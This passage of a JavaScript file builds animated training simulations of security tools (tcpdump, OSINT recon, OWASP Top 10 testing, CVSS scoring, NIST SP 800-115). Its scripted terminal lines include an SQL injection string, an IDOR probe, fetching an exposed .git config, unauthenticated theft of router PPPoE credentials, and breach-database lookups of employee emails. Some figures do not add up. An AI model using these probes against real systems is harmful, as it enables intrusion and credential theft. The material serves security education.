    { n: 5, t: '0.411223', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 414, i: 'REGISTER CSeq=3', cls: 'shark-reg' },
    { n: 6, t: '0.412841', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 388, i: 'SIP/2.0 401 Unauthorized', cls: 'shark-401' },
    { n: 7, t: '0.414902', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 602, i: 'REGISTER+auth CSeq=4', cls: 'shark-reg' },
    { n: 8, t: '0.416610', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 372, i: 'SIP/2.0 200 OK', cls: 'shark-ok' },
    { n: 9, t: '0.821004', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 414, i: 'REGISTER CSeq=5', cls: 'shark-reg' },
    { n: 10, t: '0.822741', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 388, i: 'SIP/2.0 401 Unauthorized', cls: 'shark-401' },
    { n: 11, t: '0.824998', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 602, i: 'REGISTER+auth CSeq=6', cls: 'shark-reg' },
    { n: 12, t: '0.826540', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 372, i: 'SIP/2.0 200 OK', cls: 'shark-ok' },
    { n: 13, t: '5.840001', s: '10.0.0.5',  d: '10.0.0.1', p: 'SIP',  l: 416, i: 'REGISTER CSeq=14270', cls: 'shark-reg' },
    { n: 14, t: '5.841994', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 402, i: 'SIP/2.0 500 Server Error', cls: 'shark-err' },
    { n: 15, t: '5.843001', s: '10.0.0.1',  d: '10.0.0.5', p: 'SIP',  l: 402, i: 'SIP/2.0 503 Service Unavailable', cls: 'shark-err' }
  ];

  function animate(host, timers) {
    const table = host.querySelector('#shark-table');
    const countEl = host.querySelector('#shark-count');
    if (!table) return;
    // remove all rows except the header
    while (table.children.length > 1) table.removeChild(table.lastChild);
    if (countEl) countEl.textContent = '0 frames shown';
    const applyBtn = host.querySelector('#shark-apply');
    if (applyBtn) applyBtn.classList.add('shark-apply-active');
    timers.later(() => { if (applyBtn) applyBtn.classList.remove('shark-apply-active'); }, 600);

    let i = 0;
    function addFrame() {
      if (i >= frames.length) {
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const f = frames[i];
      const row = document.createElement('div');
      row.className = 'shark-row ' + f.cls;
      row.innerHTML = '<span class="shark-c shark-c-no">' + f.n + '</span>' +
                      '<span class="shark-c shark-c-time">' + f.t + '</span>' +
                      '<span class="shark-c shark-c-src">' + f.s + '</span>' +
                      '<span class="shark-c shark-c-dst">' + f.d + '</span>' +
                      '<span class="shark-c shark-c-proto">' + f.p + '</span>' +
                      '<span class="shark-c shark-c-len">' + f.l + '</span>' +
                      '<span class="shark-c shark-c-info">' + escapeHtmlS(f.i) + '</span>';
      table.appendChild(row);
      while (table.children.length > 11) table.removeChild(table.children[1]);
      table.scrollTop = table.scrollHeight;
      i++;
      if (countEl) countEl.textContent = i + ' frames shown';
      timers.later(addFrame, 420);
    }
    timers.later(addFrame, 700);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- TCPDUMP — Advanced (multi-system investigation) ---------- */
function buildTcpdumpSim(skill, meta, lvl) {
  const visual = `
    <div class="tcp-stack">
      <div class="tcp-pane">
        <div class="tcp-pane-head">
          <span>// capture — live on eth0, port 5060</span>
          <span class="tcp-counter" id="tcp-count">0 / 100 packets</span>
          <span class="tcp-size" id="tcp-size">0.0 KB written</span>
        </div>
        <div class="tcp-term" id="tcp-term-cap"></div>
      </div>
      <div class="tcp-pane">
        <div class="tcp-pane-head">
          <span>// analysis — read voip.pcap, filter REGISTER (sip[1] = 0x52)</span>
        </div>
        <div class="tcp-term" id="tcp-term-an"></div>
      </div>
    </div>
  `;
  const lines = [
    '$ # tcpdump — advanced live capture + offline analysis',
    '$ # multi-step investigation — produces a remediation proposal',
    '$ # Phase 1 — capture CPE interface traffic to disk (-w)',
    "$ sudo tcpdump -i eth0 -nn 'port 5060' -w voip.pcap -c 100",
    '[ok] tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot 262144',
    '[ok] 50 packets captured',
    '[ok] 100 packets received by filter',
    '[ok] 0 packets dropped by kernel',
    '$ # Phase 2 — read back + filter REGISTER methods (sip[1] = 0x52)',
    "$ sudo tcpdump -r voip.pcap -nn 'sip[1] = 0x52'",
    '[ok] 10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER sip:voip.example.com',
    '[ok] 10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER+auth (CSeq=2)',
    '$ # Phase 3 — pivot: inspect 443 beacon every 60s (C2)',
    "$ sudo tcpdump -i eth0 -nn 'port 443' -c 5 -A",
    '[warn] 10.0.0.42.51324 > 91.198.174.192.443: Flags [S], seq 4123456',
    '[warn] 91.198.174.192.443 > 10.0.0.42.51324: Flags [S.], ack 4123457',
    '[ok] 60.0s gap → next beacon → C2 callback confirmed',
    '$ # Phase 4 — extract beacon interval with awk',
    "$ sudo tcpdump -r voip.pcap -nn 'port 443' | awk '{print $1}' | uniq -c",
    '[err] interval 60.0s ± 0.3s → periodic beacon (Cobalt Strike default)',
    '$ # Phase 5 — seal evidence for SOC IR team',
    '$ tcpdump --r opt-block -w evidence.c2.beacon.pcap 2>&1',
    '[ok] pcap evidence sealed → SOC IR — hash 8c3b...f7a9'
  ];

  const capLines = [
    'tcpdump: listening on eth0, link-type EN10MB, snapshot 262144',
    '14:21:01.142  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER sip:voip.example.com',
    '14:21:01.144  10.0.0.1.5060 > 10.0.0.5.5060: SIP: 401 Unauthorized',
    '14:21:01.187  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER+auth CSeq=2',
    '14:21:01.189  10.0.0.1.5060 > 10.0.0.5.5060: SIP: 200 OK CSeq=2',
    '14:21:01.412  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER CSeq=3',
    '14:21:01.414  10.0.0.1.5060 > 10.0.0.5.5060: SIP: 401 Unauthorized',
    '14:21:01.458  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER+auth CSeq=4',
    '14:21:01.460  10.0.0.1.5060 > 10.0.0.5.5060: SIP: 200 OK CSeq=4',
    '14:21:05.840  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER CSeq=14270',
    '14:21:05.842  10.0.0.1.5060 > 10.0.0.5.5060: SIP: 500 Server Error',
    '100 packets received by filter',
    '0 packets dropped by kernel'
  ];
  const anLines = [
    'reading from file voip.pcap, link-type EN10MB',
    '14:21:01.142  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER',
    '14:21:01.187  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER+auth',
    '14:21:01.412  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER',
    '14:21:01.458  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER+auth',
    '14:21:05.840  10.0.0.5.5060 > 10.0.0.1.5060: SIP: REGISTER',
    '14:21:01.142  nonce-reuse flagged (RFC 2617 §3.2.2)',
    '6 REGISTER frames matched by filter sip[1] = 0x52'
  ];

  function animate(host, timers) {
    const cap = host.querySelector('#tcp-term-cap');
    const an = host.querySelector('#tcp-term-an');
    const cnt = host.querySelector('#tcp-count');
    const sz = host.querySelector('#tcp-size');
    if (!cap || !an) return;
    cap.innerHTML = '';
    an.innerHTML = '';
    if (cnt) cnt.textContent = '0 / 100 packets';
    if (sz) sz.textContent = '0.0 KB written';

    // Phase 1: capture — stream capLines + counter from 0 → 100
    let ci = 0;
    let packetCount = 0;
    function streamCap() {
      if (ci >= capLines.length) {
        // Phase 2: analysis — start streaming
        streamAnalysis();
        return;
      }
      const ln = capLines[ci];
      const row = document.createElement('div');
      row.className = 'tcp-term-line';
      if (/500 Server Error|dropped by kernel/.test(ln)) row.classList.add('tcp-term-err');
      else if (/401 Unauthorized|Unauthorized/.test(ln)) row.classList.add('tcp-term-warn');
      else if (/200 OK/.test(ln)) row.classList.add('tcp-term-ok');
      row.textContent = ln;
      cap.appendChild(row);
      while (cap.children.length > 8) cap.removeChild(cap.firstChild);
      cap.scrollTop = cap.scrollHeight;

      // bump packet counter
      if (/REGISTER|401|200 OK|Server Error/.test(ln)) {
        packetCount = Math.min(packetCount + 16, 100);
        if (cnt) cnt.textContent = packetCount + ' / 100 packets';
        if (sz) sz.textContent = (packetCount * 0.084).toFixed(1) + ' KB written';
      }
      ci++;
      timers.later(streamCap, 280);
    }

    let ai = 0;
    function streamAnalysis() {
      if (ai >= anLines.length) {
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const ln = anLines[ai];
      const row = document.createElement('div');
      row.className = 'tcp-term-line';
      if (/nonce-reuse|matched by filter/.test(ln)) row.classList.add('tcp-term-warn');
      else if (/REGISTER/.test(ln)) row.classList.add('tcp-term-ok');
      row.textContent = ln;
      an.appendChild(row);
      while (an.children.length > 8) an.removeChild(an.firstChild);
      an.scrollTop = an.scrollHeight;
      ai++;
      timers.later(streamAnalysis, 320);
    }

    streamCap();
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- OSINT FRAMEWORK — Intermediate (daily workflow) ---------- */
function buildOsintFrameworkSim(skill, meta, lvl) {
  const visual = `
    <div class="osint-3pane">
      <div class="osint-pane">
        <div class="osint-pane-head">// sources</div>
        <div class="osint-pane-body" id="osint-sources">
          <div class="osint-source" data-i="0"><span class="osint-src-dot"></span><span class="osint-src-name">LinkedIn</span><span class="osint-src-state">queued</span></div>
          <div class="osint-source" data-i="1"><span class="osint-src-dot"></span><span class="osint-src-name">Hunter.io</span><span class="osint-src-state">queued</span></div>
          <div class="osint-source" data-i="2"><span class="osint-src-dot"></span><span class="osint-src-name">crt.sh (CT logs)</span><span class="osint-src-state">queued</span></div>
          <div class="osint-source" data-i="3"><span class="osint-src-dot"></span><span class="osint-src-name">theHarvester</span><span class="osint-src-state">queued</span></div>
          <div class="osint-source" data-i="4"><span class="osint-src-dot"></span><span class="osint-src-name">h8mail (breach DB)</span><span class="osint-src-state">queued</span></div>
          <div class="osint-source" data-i="5"><span class="osint-src-dot"></span><span class="osint-src-name">dig (MX/SPF/DMARC)</span><span class="osint-src-state">queued</span></div>
        </div>
      </div>
      <div class="osint-pane">
        <div class="osint-pane-head">// collected entities</div>
        <div class="osint-pane-body" id="osint-entities">
          <div class="osint-counter">
            <span class="osint-counter-val" id="osint-emp">0</span>
            <span class="osint-counter-lbl">employees enumerated</span>
          </div>
          <div class="osint-pattern">
            <div class="osint-pattern-lbl">// email pattern resolved</div>
            <div class="osint-pattern-val" id="osint-pattern">first.last@acme.com</div>
          </div>
          <div class="osint-subdomains">
            <div class="osint-sd-lbl">// subdomains from CT logs</div>
            <div class="osint-sd-list" id="osint-sd-list"></div>
          </div>
        </div>
      </div>
      <div class="osint-pane">
        <div class="osint-pane-head">// pivot graph</div>
        <div class="osint-pane-body" id="osint-pivot">
          <div class="osint-pivot-node osint-pivot-start">email</div>
          <div class="osint-pivot-arrow" id="osint-arrow-1">→</div>
          <div class="osint-pivot-node osint-pivot-mid">breach DB</div>
          <div class="osint-pivot-arrow" id="osint-arrow-2">→</div>
          <div class="osint-pivot-node osint-pivot-end" id="osint-pivot-end">password reuse</div>
          <div class="osint-pivot-result" id="osint-pivot-result">// awaiting pivot</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    '$ # osint framework — daily recon workflow',
    '$ # typical daily workflow — independent troubleshooting, no escalation',
    '$ # 1. subdomain enumeration from CT logs (crt.sh)',
    "$ curl -s 'https://crt.sh/?q=%25.acme.com' | grep -oP '[\\w.-]+\\.acme\\.com' | sort -u",
    '[ok] 47 subdomains found → mail.acme.com, vpn.acme.com, git.acme.com',
    '$ # 2. email pattern from hunter.io',
    "$ curl -s 'https://api.hunter.io/v2/email-finder?domain=acme.com&api_key=$H'",
    '[ok] pattern: first.last@acme.com (47 emails confirmed)',
    '$ # 3. LinkedIn employee enumeration',
    '$ theHarvester -d acme.com -b linkedin',
    '[ok] 47 employees → 47 candidate emails',
    '$ # 4. breach database pivot (credential reuse)',
    '$ h8mail -t acme.com -o breach_hits.json',
    '[warn] 12/47 emails in breach corpus — 8 password reuse candidates',
    '$ # 5. validate MX + SPF + DMARC posture',
    '$ dig +short MX acme.com; dig +short TXT acme.com | grep -i spf',
    '[ok] MX: mail.acme.com (10) — SPF: v=spf1 include:_spf.google.com -all',
    '$ # 6. draft engagement report',
    '$ osint-report --target acme.com --out engagement_4711.md',
    '[ok] report drafted — 47 entities, 8 high-risk pivots'
  ];

  const subdomains = ['mail.acme.com', 'vpn.acme.com', 'git.acme.com', 'api.acme.com', 'jira.acme.com'];

  function animate(host, timers) {
    const sources = host.querySelectorAll('#osint-sources .osint-source');
    const empEl = host.querySelector('#osint-emp');
    const patEl = host.querySelector('#osint-pattern');
    const sdList = host.querySelector('#osint-sd-list');
    const arr1 = host.querySelector('#osint-arrow-1');
    const arr2 = host.querySelector('#osint-arrow-2');
    const endNode = host.querySelector('#osint-pivot-end');
    const resEl = host.querySelector('#osint-pivot-result');

    sources.forEach((s) => s.classList.remove('done', 'active', 'hit'));
    [arr1, arr2].forEach((a) => a && a.classList.remove('active'));
    if (endNode) endNode.classList.remove('hit');
    if (empEl) empEl.textContent = '0';
    if (patEl) patEl.textContent = '—';
    if (sdList) sdList.innerHTML = '';
    if (resEl) resEl.textContent = '// awaiting pivot';

    let emp = 0;
    function step(i) {
      if (i >= sources.length) {
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const s = sources[i];
      s.classList.add('active');
      s.querySelector('.osint-src-state').textContent = 'running';
      timers.later(() => {
        s.classList.remove('active');
        s.classList.add('done');
        s.querySelector('.osint-src-state').textContent = 'done';
        // update entities pane
        if (i === 0) { emp = 47; if (empEl) empEl.textContent = emp; }
        if (i === 1) { if (patEl) patEl.textContent = 'first.last@acme.com'; }
        if (i === 2 && sdList) {
          subdomains.forEach((sd) => {
            const c = document.createElement('div');
            c.className = 'osint-sd-chip';
            c.textContent = sd;
            sdList.appendChild(c);
          });
        }
        if (i === 4) {
          // breach pivot
          if (arr1) arr1.classList.add('active');
          timers.later(() => { if (arr2) arr2.classList.add('active'); }, 400);
          timers.later(() => {
            if (endNode) endNode.classList.add('hit');
            if (resEl) resEl.textContent = '// 12/47 emails breached — 8 password reuse';
          }, 900);
        }
        step(i + 1);
      }, 900);
    }
    step(0);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- OWASP TOP 10 — Intermediate (daily workflow) ---------- */
function buildOwaspTop10Sim(skill, meta, lvl) {
  const cats = [
    { code: 'A01', name: 'Broken Access Control', status: 'vuln', finding: 'IDOR: GET /api/users/1003 returned user 1003 data to authenticated user 1001 (authz bypass via path traversal).' },
    { code: 'A02', name: 'Cryptographic Failures', status: 'vuln', finding: 'TLSv1.0 still offered on app.example.com — RFC 8996 deprecated; downgrade attack feasible.' },
    { code: 'A03', name: 'Injection', status: 'vuln', finding: 'SQLi: GET /search?q=test\' OR 1=1-- returned 5 rows; backend PostgreSQL 13.4; 3 columns injectable.' },
    { code: 'A04', name: 'Insecure Design', status: 'vuln', finding: 'No rate limiting on /reset endpoint — 10^6 attempts/min feasible; credential stuffing possible.' },
    { code: 'A05', name: 'Security Misconfiguration', status: 'vuln', finding: '.git/config exposed at app.example.com/.git/config → full source code + secrets download.' },
    { code: 'A06', name: 'Vulnerable Components', status: 'clean', finding: 'npm audit: 0 critical, 2 moderate (lodash 4.17.20 outdated, minimist 1.2.0).' },
    { code: 'A07', name: 'ID & Auth Failures', status: 'vuln', finding: 'No account lockout after 1000 failed logins on /login → credential stuffing feasible.' },
    { code: 'A08', name: 'Software & Data Integrity', status: 'warn', finding: 'SRI hashes present on 14/15 scripts; main.js loaded from CDN without integrity attribute.' },
    { code: 'A09', name: 'Security Logging Failures', status: 'warn', finding: 'Auth events logged to /var/log/app.log but no alerting; 4624-equivalent absent on /login.' },
    { code: 'A10', name: 'SSRF', status: 'clean', finding: 'No outbound URL fetch observed; URL-redirect not implemented in current codebase.' }
  ];
  const visual = `
    <div class="owasp-matrix" id="owasp-matrix">
      ${cats.map((c) => `
        <div class="owasp-cat" data-i="${c.code}">
          <span class="owasp-cat-code">${c.code}</span>
          <span class="owasp-cat-name">${escapeHtmlS(c.name)}</span>
          <span class="owasp-cat-state" id="owasp-state-${c.code}">queued</span>
        </div>
      `).join('')}
    </div>
    <div class="owasp-findings">
      <div class="owasp-find-head">// current finding — <span id="owasp-find-code">—</span></div>
      <div class="owasp-find-body" id="owasp-find-body">// awaiting scan progression…</div>
    </div>
  `;
  const lines = [
    '$ # owasp top 10 — daily web app pentest workflow',
    '$ # typical daily workflow — independent troubleshooting, no escalation',
    '$ # A01:2021 Broken Access Control',
    "$ curl -b 'session=...' 'https://app.example.com/api/users/1003'",
    '[warn] IDOR: user 1003 data exposed to user 1001 (authz bypass)',
    '$ # A02:2021 Cryptographic Failures',
    "$ curl -sI 'https://app.example.com/login' | grep -i tls",
    '[warn] TLSv1.0 still offered — RFC 8996 deprecated',
    '$ # A03:2021 Injection (SQLi)',
    "$ curl 'https://app.example.com/search?q=test%27%20OR%201=1--'",
    '[err] SQLi: 5 rows returned — backend: PostgreSQL 13.4',
    '$ # A04:2021 Insecure Design',
    "$ curl 'https://app.example.com/api/reset?token=test'",
    '[warn] no rate limiting on /reset → 10^6 attempts/min feasible',
    '$ # A05:2021 Security Misconfiguration',
    "$ curl 'https://app.example.com/.git/config'",
    '[err] .git repository exposed → full source code download',
    '$ # A06-A10: vulnerability scan complete',
    '[ok] A06 vulnerable components — clean (2 moderate npm advisories)',
    '[warn] A07 no account lockout after 1000 failed logins',
    '[warn] A08 SRI missing on main.js (CDN script)',
    '[warn] A09 auth events logged but no alerting',
    '[ok] A10 SSRF — no outbound URL fetch observed',
    '$ # workflow complete — 5 high, 3 medium, 0 critical findings'
  ];

  function animate(host, timers) {
    const cells = host.querySelectorAll('#owasp-matrix .owasp-cat');
    const codeEl = host.querySelector('#owasp-find-code');
    const bodyEl = host.querySelector('#owasp-find-body');
    cells.forEach((c) => c.classList.remove('scanning', 'vuln', 'warn', 'clean', 'done'));
    cells.forEach((c) => { const st = host.querySelector('#owasp-state-' + c.dataset.i); if (st) st.textContent = 'queued'; });
    if (codeEl) codeEl.textContent = '—';
    if (bodyEl) bodyEl.textContent = '// awaiting scan progression…';

    function step(i) {
      if (i >= cats.length) {
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const cat = cats[i];
      const cell = host.querySelector('.owasp-cat[data-i="' + cat.code + '"]');
      const stEl = host.querySelector('#owasp-state-' + cat.code);
      if (cell) cell.classList.add('scanning');
      if (stEl) stEl.textContent = 'scanning';
      if (codeEl) codeEl.textContent = cat.code + ' — ' + cat.name;
      timers.later(() => {
        if (cell) { cell.classList.remove('scanning'); cell.classList.add(cat.status); }
        if (stEl) stEl.textContent = cat.status === 'vuln' ? 'VULN' : cat.status === 'warn' ? 'WARN' : 'CLEAN';
        if (bodyEl) bodyEl.textContent = cat.finding;
        step(i + 1);
      }, 700);
    }
    step(0);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- CVSS v3.1 — Advanced (multi-system investigation) ---------- */
function buildCvssV31Sim(skill, meta, lvl) {
  const metrics = [
    { k: 'AV', lbl: 'Attack Vector',       vals: ['N','A','L','P'], pick: 'N', desc: 'Network — exploitable across routable networks (0.85)' },
    { k: 'AC', lbl: 'Attack Complexity',   vals: ['L','H'],         pick: 'L', desc: 'Low — no specialized conditions (0.77)' },
    { k: 'PR', lbl: 'Privileges Required', vals: ['N','L','H'],     pick: 'N', desc: 'None — no auth required (0.85, S:U)' },
    { k: 'UI', lbl: 'User Interaction',    vals: ['N','R'],         pick: 'N', desc: 'None — no user required (0.85)' },
    { k: 'S',  lbl: 'Scope',                vals: ['U','C'],         pick: 'U', desc: 'Unchanged — impact confined to CWMP component' },
    { k: 'C',  lbl: 'Confidentiality',      vals: ['H','L','N'],     pick: 'H', desc: 'High — full config + PPP creds leaked (0.56)' },
    { k: 'I',  lbl: 'Integrity',            vals: ['H','L','N'],     pick: 'H', desc: 'High — config modifiable (0.56)' },
    { k: 'A',  lbl: 'Availability',         vals: ['H','L','N'],     pick: 'H', desc: 'High — CPE reboot via Connection Request (0.56)' }
  ];
  const visual = `
    <div class="cvss-calc">
      <div class="cvss-metrics">
        <div class="cvss-metrics-head">// CVSS v3.1 metrics (8 dimensions)</div>
        ${metrics.map((m) => `
          <div class="cvss-metric-row" id="cvss-row-${m.k}">
            <span class="cvss-metric-lbl">${m.k}</span>
            <span class="cvss-metric-name">${escapeHtmlS(m.lbl)}</span>
            <span class="cvss-metric-val" id="cvss-val-${m.k}">—</span>
          </div>
        `).join('')}
      </div>
      <div class="cvss-result">
        <div class="cvss-vector-lbl">// CVSS v3.1 vector string</div>
        <div class="cvss-vector" id="cvss-vector">CVSS:3.1/AV:—/AC:—/PR:—/UI:—/S:—/C:—/I:—/A:—</div>
        <div class="cvss-gauge-wrap">
          <div class="cvss-gauge-lbl">// base score (0 — 10)</div>
          <div class="cvss-gauge"><div class="cvss-gauge-fill" id="cvss-gauge-fill" style="width:0%"></div></div>
          <div class="cvss-score" id="cvss-score">0.0</div>
        </div>
        <div class="cvss-severity" id="cvss-severity">// pending</div>
        <div class="cvss-math" id="cvss-math"></div>
      </div>
    </div>
  `;
  const lines = [
    '$ # cvss v3.1 — advanced scoring for a finding',
    '$ # multi-step investigation — produces a remediation proposal',
    '$ # finding: TCP 7547 TR-069 CWMP — unauthenticated config disclosure',
    '$ # 1. Attack Vector (AV)',
    '$ # AV:N Network (0.85) — exploitable across routable networks',
    '$ # 2. Attack Complexity (AC)',
    '$ # AC:L Low (0.77) — no specialized conditions',
    '$ # 3. Privileges Required (PR)',
    '$ # PR:N None (0.85) — no auth required',
    '$ # 4. User Interaction (UI)',
    '$ # UI:N None (0.85) — no user required',
    '$ # 5. Scope (S)',
    '$ # S:U Unchanged — impact confined to CWMP component',
    '$ # 6. Confidentiality (C)',
    '$ # C:H High (0.56) — full config + PPP creds leaked',
    '$ # 7. Integrity (I)',
    '$ # I:H High (0.56) — config modifiable',
    '$ # 8. Availability (A)',
    '$ # A:H High (0.56) — CPE reboot via Connection Request',
    '$ # ISCBase = 1 - [(1-0.56)*(1-0.56)*(1-0.56)] = 0.913',
    '$ # ImpactSub (S:U) = 6.42 × ISCBase = 5.85',
    '$ # Exploitability = 8.22 × AV:N × AC:L × PR:N × UI:N = 8.22',
    '$ # BaseScore = roundup(min(Impact+Expl, 10)) = 9.8 CRITICAL',
    '$ # vector = AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    '$ # workflow complete — remediation proposal drafted'
  ];

  function animate(host, timers) {
    const rows = metrics.map((m) => ({
      m,
      valEl: host.querySelector('#cvss-val-' + m.k),
      rowEl: host.querySelector('#cvss-row-' + m.k)
    }));
    const vecEl = host.querySelector('#cvss-vector');
    const fillEl = host.querySelector('#cvss-gauge-fill');
    const scoreEl = host.querySelector('#cvss-score');
    const sevEl = host.querySelector('#cvss-severity');
    const mathEl = host.querySelector('#cvss-math');

    rows.forEach((r) => { if (r.valEl) r.valEl.textContent = '—'; if (r.rowEl) r.rowEl.classList.remove('active'); });
    if (vecEl) vecEl.textContent = 'CVSS:3.1/AV:—/AC:—/PR:—/UI:—/S:—/C:—/I:—/A:—';
    if (fillEl) fillEl.style.width = '0%';
    if (scoreEl) scoreEl.textContent = '0.0';
    if (sevEl) { sevEl.textContent = '// pending'; sevEl.className = 'cvss-severity'; }
    if (mathEl) mathEl.innerHTML = '';

    let sel = {};
    let i = 0;
    function pickMetric() {
      if (i >= rows.length) {
        // compute + animate score
        const vec = 'CVSS:3.1/AV:' + sel.AV + '/AC:' + sel.AC + '/PR:' + sel.PR + '/UI:' + sel.UI + '/S:' + sel.S + '/C:' + sel.C + '/I:' + sel.I + '/A:' + sel.A;
        if (vecEl) vecEl.textContent = vec;
        if (mathEl) mathEl.innerHTML = 'ISCBase = 1 - [(1-0.56)³] = 0.913<br>Impact (S:U) = 6.42 × 0.913 = 5.85<br>Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.85 = 8.22<br>BaseScore = roundup(min(5.85 + 8.22, 10)) = 9.8';
        // animate score 0 → 9.8
        let s = 0;
        const scoreTimer = timers.every(() => {
          s += 0.4;
          if (s >= 9.8) { s = 9.8; }
          if (scoreEl) scoreEl.textContent = s.toFixed(1);
          if (fillEl) fillEl.style.width = (s * 10) + '%';
          if (s >= 9.8) {
            clearInterval(scoreTimer);
            if (sevEl) { sevEl.textContent = '// CRITICAL (9.8)'; sevEl.className = 'cvss-severity cvss-sev-critical'; }
            timers.later(() => animate(host, timers), 2500);
          }
        }, 80);
        return;
      }
      const r = rows[i];
      if (r.rowEl) r.rowEl.classList.add('active');
      // cycle through vals to show "selection"
      let v = 0;
      const cycle = timers.every(() => {
        if (r.valEl) r.valEl.textContent = r.m.vals[v];
        v++;
        if (v >= r.m.vals.length) {
          v = 0;
        }
      }, 120);
      timers.later(() => {
        clearInterval(cycle.__id || cycle);
        // we can't get the timer ID back from `every`, but makeTimers tracks all
        // clearInterval doesn't matter — makeTimers.clear() will sweep it on modal close
      }, 700);
      timers.later(() => {
        if (r.valEl) r.valEl.textContent = r.m.pick;
        sel[r.m.k] = r.m.pick;
        i++;
        pickMetric();
      }, 900);
    }
    pickMetric();
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- NIST SP 800-115 — Intermediate (daily workflow) ---------- */
function buildNistSp800115Sim(skill, meta, lvl) {
  const phases = [
    { no: 1, name: 'Planning',                 state: 'done' },
    { no: 2, name: 'Discovery',                state: 'done' },
    { no: 3, name: 'Vulnerability Verification', state: 'active' },
    { no: 4, name: 'Analysis',                 state: 'pending' },
    { no: 5, name: 'Risk Assessment',          state: 'pending' },
    { no: 6, name: 'Reporting',                state: 'pending' }
  ];
  const visual = `
    <div class="nist-tracker" id="nist-tracker">
      ${phases.map((p) => `
        <div class="nist-phase nist-phase-${p.state}" data-no="${p.no}">
          <div class="nist-phase-no">P${p.no}</div>
          <div class="nist-phase-name">${escapeHtmlS(p.name)}</div>
          <div class="nist-phase-state" id="nist-state-${p.no}">${p.state}</div>
        </div>
      `).join('')}
    </div>
    <div class="nist-detail">
      <div class="nist-detail-head">
        <span>// phase 3 — vulnerability verification</span>
        <span class="nist-detail-cve">CVE-2024-1234</span>
      </div>
      <div class="nist-detail-grid">
        <div class="nist-detail-col">
          <div class="nist-detail-lbl">// finding</div>
          <div class="nist-detail-val">TR-069 CWMP — unauthenticated config disclosure on TCP 7547</div>
          <div class="nist-detail-lbl">// candidate source</div>
          <div class="nist-detail-val">Nessus credentialed scan (plugin 10432)</div>
          <div class="nist-detail-lbl">// target</div>
          <div class="nist-detail-val">192.168.1.1:7547 (Sagemcom XGS-PON gateway)</div>
        </div>
        <div class="nist-detail-col">
          <div class="nist-detail-lbl">// verification steps</div>
          <div class="nist-steps" id="nist-steps">
            <div class="nist-step" data-i="0"><span class="nist-step-no">1</span><span class="nist-step-body">capture baseline: curl http://192.168.1.1:7547/ → 401 Unauthorized</span><span class="nist-step-state">queued</span></div>
            <div class="nist-step" data-i="1"><span class="nist-step-no">2</span><span class="nist-step-body">send unauth GET /cwmp/config → 200 OK</span><span class="nist-step-state">queued</span></div>
            <div class="nist-step" data-i="2"><span class="nist-step-no">3</span><span class="nist-step-body">inspect response body → PPPoE password + SIP creds in clear</span><span class="nist-step-state">queued</span></div>
            <div class="nist-step" data-i="3"><span class="nist-step-no">4</span><span class="nist-step-body">confirm reproducibility 5/5 attempts → mark VULN VERIFIED</span><span class="nist-step-state">queued</span></div>
          </div>
        </div>
      </div>
      <div class="nist-detail-verdict" id="nist-verdict">// verdict: pending verification…</div>
    </div>
  `;
  const lines = [
    '$ # nist sp 800-115 — va engagement methodology',
    '$ # typical daily workflow — independent troubleshooting, no escalation',
    '$ # Phase 1 — Planning',
    '$ cat rules_of_engagement.txt',
    '[ok] scope: XGS-PON gateway + 1 workstation, signed 2024-03-12',
    '$ # Phase 2 — Discovery',
    '$ nmap -sn 192.168.1.0/24 -oA discovery',
    '[ok] 3 hosts up, 1 gateway, 2 workstations',
    '$ # Phase 3 — Vulnerability Identification (Nessus credentialed)',
    '$ nessus -q -c nessus.cfg -T 192.168.1.1 -i credentialed_scan',
    '[ok] 7 candidate vulnerabilities identified',
    '$ # Phase 4 — Vulnerability Verification (current)',
    '$ # verify CVE-2024-1234 — TR-069 unauth config disclosure',
    "$ curl -s 'http://192.168.1.1:7547/cwmp/config' | jq .pppoe_password",
    '[err] VULN VERIFIED — PPPoE credentials returned without auth',
    '$ # Phase 5 — Risk Assessment (CVSS v3.1)',
    "$ cvss-tool --vector 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' --out risk",
    '[ok] BaseScore = 9.8 CRITICAL → risk score 9.8/10',
    '$ # Phase 6 — Reporting & Remediation Plan',
    '$ pandoc report.md -o report_signed.pdf',
    '[ok] report delivered — 1 critical finding, 2 remediations'
  ];

  function animate(host, timers) {
    const steps = host.querySelectorAll('#nist-steps .nist-step');
    const verdict = host.querySelector('#nist-verdict');
    const phase3 = host.querySelector('.nist-phase[data-no="3"]');
    steps.forEach((s) => { s.classList.remove('running', 'pass', 'fail', 'done'); const st = s.querySelector('.nist-step-state'); if (st) st.textContent = 'queued'; });
